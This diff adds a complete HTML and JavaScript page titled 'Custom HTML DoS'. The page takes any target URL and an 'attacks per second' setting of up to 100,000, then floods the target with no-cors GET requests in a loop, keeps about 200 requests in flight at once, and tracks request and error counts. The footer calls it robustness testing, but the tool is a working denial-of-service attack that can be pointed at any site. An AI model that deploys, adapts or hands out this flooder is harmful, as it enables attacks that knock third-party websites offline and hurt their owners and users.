@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Custom HTML DoS</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"
+        integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous"></script>
+
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+
+        .intro .howto {
+            background-color: #005BBC;
+        }
+
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+            color: #005BBC;
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .desc {
+            color: black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+
+        table.status {
+            margin-bottom: 10px;
+        }
+
+        .alert {
+            display: none;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <h1 class="title">Custom HTML DoS</h1>
+
+    <!-- URL入力セクション -->
+    <div class="container">
+        <h3>Enter Target URL</h3>
+        <form id="urlForm">
+            <div class="mb-3">
+                <label for="targetUrl" class="form-label">Target URL:</label>
+                <input type="text" class="form-control" id="targetUrl" placeholder="https://example.com">
+            </div>
+            <div class="mb-3">
+                <label for="attackFrequency" class="form-label">Attacks per Second:</label>
+                <input type="number" class="form-control" id="attackFrequency" min="1" max="100000" value="100">
+                <span id="frequencyDisplay">100</span> requests/second
+            </div>
+        </form>
+        <div class="alert alert-danger" id="alertMessage">Please enter a valid URL.</div>
+        <button type="button" class="btn btn-primary" onclick="togglePause();">Start Attack</button>
+    </div>
+
+    <div class="desc text-center">
+        <h3>Session Status</h3>
+        <p>The number of GET requests and error responses for the targeted website is shown below.</p>
+        <p>Total number of requests: <span id="totalrequests">0</span></p>
+        <p>Total number of errors: <span id="totalerrors">0</span></p>
+    </div>
+
+    <div id="stats" class="container">
+        <div class="row">
+        </div>
+    </div>
+
+    <p class="footer">This is a custom implementation for testing website robustness.</p>
+
+    <script>
+        var target = null;
+        var statRow = document.querySelector("#stats > .row");
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        var CONCURRENCY_LIMIT = 200;
+
+        function togglePause() {
+            var url = document.getElementById('targetUrl').value;
+            if (!url) {
+                // URLが入力されていない場合にエラーメッセージを表示
+                document.getElementById('alertMessage').style.display = 'block';
+                return;
+            } else {
+                // URLが入力されたらエラーメッセージを非表示にする
+                document.getElementById('alertMessage').style.display = 'none';
+            }
+
+            if (attack) {
+                attack = false;
+                document.querySelector(".btn").innerText = "Start Attack";
+            } else {
+                attack = true;
+                document.querySelector(".btn").innerText = "Pause Attack";
+                initiateFlood();
+            }
+        }
+
+        document.getElementById('attackFrequency').addEventListener('input', function () {
+            document.getElementById('frequencyDisplay').innerText = this.value;
+        });
+
+        function initiateFlood() {
+            var url = document.getElementById('targetUrl').value;
+            var frequency = parseInt(document.getElementById('attackFrequency').value);
+            target = { url: url, number_of_requests: 0, number_of_errored_responses: 0 };
+
+            flood(url, frequency);
+        }
+
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }
+
+        async function flood(url, frequency) {
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+
+                for (let i = 0; i < frequency; i++) {
+                    queue.push(
+                        fetchWithTimeout(url, { timeout: 2000 })
+                            .catch((error) => {
+                                target.number_of_errored_responses++;
+                                totalerrors++;
+                            })
+                            .then((response) => {
+                                if (response && !response.ok) {
+                                    target.number_of_errored_responses++;
+                                    totalerrors++;
+                                }
+                                target.number_of_requests++;
+                                totalrequests++;
+                            })
+                            .finally(() => updateTargetDisplay())
+                    );
+                }
+
+                await sleep(1000);
+            }
+        }
+
+        function updateTargetDisplay() {
+            document.getElementById("totalrequests").innerText = totalrequests;
+            document.getElementById("totalerrors").innerText = totalerrors;
+        }
+    </script>
+
+</body>
+
+</html>
